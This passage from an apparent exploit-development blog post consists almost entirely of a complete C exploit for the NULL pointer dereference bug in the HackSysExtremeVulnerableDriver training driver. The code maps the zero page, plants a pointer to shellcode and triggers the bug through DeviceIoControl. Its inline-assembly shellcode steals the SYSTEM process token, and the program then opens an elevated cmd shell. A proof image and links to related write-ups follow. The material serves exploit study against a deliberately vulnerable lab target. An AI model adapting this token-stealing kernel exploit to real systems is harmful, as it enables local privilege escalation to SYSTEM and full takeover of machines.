<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
#define Null_Pointer_Dereference 0x22202b
</span>
<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span>
<span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">My_NtAllocateVirtualMemory</span><span class="p">)(</span>
  <span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
  <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ZeroBits</span><span class="p">,</span>
  <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">RegionSize</span><span class="p">,</span>
  <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
  <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Protect</span>
  <span class="p">);</span>

<span class="n">My_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="k">static</span> <span class="n">VOID</span> <span class="nf">ShellCode</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_asm</span>
  <span class="p">{</span>
    <span class="c1">//int 3</span>
    <span class="n">pop</span> <span class="n">edi</span>
    <span class="n">pop</span> <span class="n">esi</span>
    <span class="n">pop</span> <span class="n">ebx</span>
    <span class="n">pushad</span>
    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">fs</span><span class="o">:</span> <span class="p">[</span><span class="mx">124h</span><span class="p">]</span>   <span class="c1">// Find the _KTHREAD structure for the current thread</span>
    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span>   <span class="c1">// Find the _EPROCESS structure</span>
    <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
    <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span>        <span class="c1">// edx = system PID(4)</span>

    <span class="c1">// The loop is to get the _EPROCESS of the system</span>
    <span class="n">find_sys_pid</span> <span class="o">:</span>
    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// Find the process activity list</span>
    <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xb8</span>       <span class="c1">// List traversal</span>
    <span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb4</span><span class="p">],</span> <span class="n">edx</span>    <span class="c1">// Determine whether it is SYSTEM based on PID</span>
    <span class="n">jnz</span> <span class="n">find_sys_pid</span>

    <span class="c1">// Replace the Token</span>
    <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">]</span>
    <span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">],</span> <span class="n">edx</span>
    <span class="n">popad</span>
    <span class="c1">//int 3</span>
    <span class="n">ret</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="c1">// Get HANDLE</span>
  <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">,</span>
    <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">OPEN_EXISTING</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
  <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
  <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
  <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">L"cmd.exe"</span> <span class="p">};</span>
  <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="n">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="nf">Trigger_shellcode</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="o">*</span><span class="p">(</span><span class="n">PDWORD32</span><span class="p">)(</span><span class="n">buf</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xAAAAAAAA</span><span class="p">;</span>

  <span class="o">*</span><span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span>
    <span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"ntdll"</span><span class="p">),</span>
    <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Failed to get function NtAllocateVirtualMemory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">PVOID</span> <span class="n">Zero_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
  <span class="n">SIZE_T</span> <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Started to alloc zero page...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">NtAllocateVirtualMemory</span><span class="p">(</span>
    <span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">Zero_addr</span><span class="p">,</span>
    <span class="mi">0</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span>
    <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
    <span class="n">PAGE_READWRITE</span><span class="p">))</span> <span class="o">||</span> <span class="n">Zero_addr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Failed to alloc zero page!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Success to alloc zero page...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ShellCode</span><span class="p">;</span>

  <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">Null_Pointer_Dereference</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">init</span><span class="p">()</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Failed to get HANDLE!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">Trigger_shellcode</span><span class="p">();</span>
  <span class="c1">//__debugbreak();</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Start to Create cmd...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="c1">//CreateCmd();</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/post_images/12.png" alt="Proof" /></p>

<p><a href="https://rootkits.xyz/blog/2018/01/kernel-null-pointer-dereference/">site</a></p>

<p><a href="https://h0mbre.github.io/HEVD_NULLPointerDereference_32bit/#">site 2</a></p>

</article>
      </section>
    </div>
  </div>
</body>

</html>
